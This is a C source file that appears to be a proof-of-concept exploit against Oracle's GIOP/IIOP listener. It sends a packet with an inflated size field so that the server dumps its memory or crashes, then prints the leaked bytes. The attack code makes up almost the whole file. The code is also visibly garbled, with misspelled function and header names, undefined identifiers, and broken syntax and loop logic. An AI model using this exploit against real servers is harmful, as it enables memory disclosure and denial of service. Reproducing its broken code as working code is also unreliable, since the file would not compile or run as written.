#include <stdio.h>
#include <stdlib.h>
#include<window.h>
#include<winsock.h>
/* 
We are exploiting vulnerability in Oracle server using GIOP (General Inter-Orb Protocol), as the result of this
attacker can either dump arbitrary  memory from the server over the network or crash server.
GIOP packets have a size element in the header that indicates how many data client is sending.
The server uses this parameter to build its response. If the client sends size larger than actually size of data that 
he is sending ( fake value in the header field) the server will read data in the memory up to this fake value, it may 
end up reading uninitialized values and access violates-thus denying service and take over .

 */


int SendGIOPPacket(void);
int StartWinSock(void);
int packet_length(char*);
int PrintResponse(unsigned char * p,int l);
int bswap_i(unsigned int);


struct sockaddr_in s_sa;
struct hostent *he;
unsigned int *addr;
int IIOPPort=2481;
char host[260]="";

int PKT_LEN=148;

unsigned char GIOPPacketheader[2000]="\x47\x49\x4f\x50"      // MAGIC
"\x01\x00"            // VERSION
"\x00"                  // BYTE ORDER
"\x00"                  // MSG_TYPE
"\x00\x00\x00\x82"      // MSG_SIZE
"\x00\x00\x00\x00"
"\x00\x00\x00\x00"
"\x01\x00\x00\x00"
"\x00\x00\xFF\xFF";      // SIZE

unsigned char GIOPPacketTail[]=
"\x00"
"\x49\x4e\x49\x54"
"\x00\x00\x00\x00"
"\x00\x04"
"\x67\x65\x74\x00"
"\x00\x00\x00\x00\x00\x00"
"\x00\x0c"
"\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65\x00";





int main(int argc, char *argv[]) {
	unsigned int ErrorLevel=0,bytes=0;
	unsigned short len=0;
	int count =0;
	unsigned char sid[100]="";
	unsigned char buffer[512]="";
	
	
	if(argc!=4)
	{
		return printf("%s Host SID bytes\n",argv[0]);
			
	}
	
	strncpy(host,argv[1],256);
	strncpy(sid,argv[2],96);
	bytes=atoi(argv[3]);
	
	
	_snprintf(buffer,508,"ORCL(CONNECT_DATA=(REP_ID=IDL:CORBA/InitialReferences:1.0)(SID=%s)(SESSION_ID=0))",sid);
	
	
	len=(unsigned short)strlen(sid)+0x82;
	PKT_LEN=len+0xC;
	bytes=bswap_i(bytes);
	memmove(&GIOPPacketheader[24],&bytes,4);
	memmove(&GIOPPacketheader[28],buffer,strlen(buffer));
	memmove(&GIOPPacketheader[28+strlen(buffer)],GIOPPacketTail,35);
	
	GIOPPacketheader[11]=(unsigned char )len;
	len=len<<8;
	GIOPPacketheader[10]=(unsigned char)len;
	
	
	if(StartWinSoc()==0)
	{
		printf("error starting winSock");
	return 0;	
	}
	
	SendGIOPPacket();
	return 0;
	
		
	
	
	
	
}


int bswap_i(unsigned int v)
{
	_asm
	{
		xor eax,eax
		mov eax,v
		bswap eax
		mov v,eax
		
	}
	return v
}


int StartWinSock()
{
	
	int err=0;
	WORD wVersionRequested;
	WSADATA wsaData;
	wVersionRequested=MAKEWORD(2,0);
	err=WSAStartup(wVersionRequested,&wsaData);
	if(err!=0)
	{
		return 0;
	}
	
	if(LOBYTE(wsaData.wVersion)!=2 || HIBYTE(wsaData.wVersion)!=0)
	{
		WSACleanup();
		return 0;
	}
	
	
	if(isalpha(host[0]))
	{
		he=gethostbyname(host);
	}
	else
	{
		addr=inet_addr(host);
		he=gethostbyaddr((char * )&addr,4,AF_INET );
		
		
	}
	
	if(he ==NULL)
	return 0;
	
	s_sa.sin_addr.s_addr=INADDR_ANY;
	s_sa.sin_family=AFINET;
	memcpy(s_sa.sin_addr,he->h_addr,h->h_length);
	return 1;
	
}


int SendGIOPPacket(void)
{
	SOCKET c_sock;
	unsigned char resp[10000]="";
	int snd=0,count=0,rcv=0,var=0;
	unsigned int ttlbytes=0;
	unsigned int to=2000;
	struct sockaddr_in ,srv_addr,cli_addr;
	SOCKET cli_sock;
unsigned int size=0;
char *buf=NULL;


cli_sock=socket(AF_INET,SOCK_STREAM,0);
if(cli_sock==INVALID_SOCKET)
{
	return printf("Sock error");
	
	}
	//htons() -make sure that are numbers are stored in memory in network byte order 
	// it means the most significant byte first 
	//to put that in other words -  it converts from host byte order into network byte order 
	s_sa.sin_port=htons((unsigned short )IIOPPort);
		
	
	
	if(connect(cli_sock,(LPSOCKADDR)&s_sa,sizeof(s_sa) ==SOCKET_ERROR  )
	{
		printf("Connect Error %d\n",GetLastError());
		return closesocket(cli_sock);
	}
	
	buf=malloc(264);
	if(!buf)
	{
		printf("malloc failed");
		return 0;
	}
	
	memset(buf,0,264);
	snd=send(cli_sock,GIOPPacketheader,PKT_LEN,0);
	while(rec!=SOCKET_ERROR)
	{
		rcv=recv(cli_sock,resp,260,0);
		if(rcv==0 || rcv==SOCKET_ERROR)
		{
			break;
		}
		
		memmove(&buf[size],resp,rcv);
		size=size+rcv;
		buf=realloc(buf,size+260);
		if(!buf)
		{
			
			printf("realloc failed");
			closesocket(cli_sock);
			return 0;
			
		}
		
		
	}
	
	
	PrintResponse(buf,size);
	closesocket(cli_sock);
	return 0;
}



int PrintResponse(unsigned char *ptr,int size)
{
	int count=0;
	int chk=0;
	int sp=0;
	printf("%.4X",count);
	while(count<size)
	{
		if(count%16==0 count >0)
		{
			printf( " ");
			chk=count;
			count=count-16;
			while(count<chk)
			{
				if(ptr[count]<0x20)
				{
					printf(".");
				}
				else
				{
					printf("%c",ptr[count]);
					count++;
					
				}
			
			
		}
			printf("%.4x",count);
			
			
		}
		printf("%.2x",ptr[count]);
		count++;
	}
	count=count-chk;
	count=17-count;
	while(sp<count)
	{
		printf(" ");
		sp++;
	}
	
	count=chk;

while(count<size)
{
	if(ptr[count]<0x20)
	{
		printf(".");
		
	}
	else
	{
		printf("%c",ptr[count]);
		count++;
	}

}
	printf("\n\n\n\");
	return 0;

}

